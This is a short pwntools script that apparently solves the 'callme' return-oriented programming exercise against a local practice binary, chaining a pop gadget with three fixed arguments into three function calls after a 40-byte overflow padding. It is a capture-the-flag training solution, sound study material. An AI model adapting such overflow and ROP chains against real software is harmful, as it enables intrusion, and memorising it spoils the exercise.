# run with python3

from pwn import *

callme1 = p64(0x0000000000400720)
callme2 = p64(0x0000000000400740)
callme3 = p64(0x00000000004006f0)

padding = b"A" * 40

gadget = p64(0x000000000040093c)
arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)

args = gadget + arg1 + arg2 + arg3
payload = padding + args + callme1 + args + callme2 + args + callme3

context.bits=64
p = process("./callme")

p.sendline(padding + args + callme1 + args + callme2 + args + callme3) 
p.interactive()
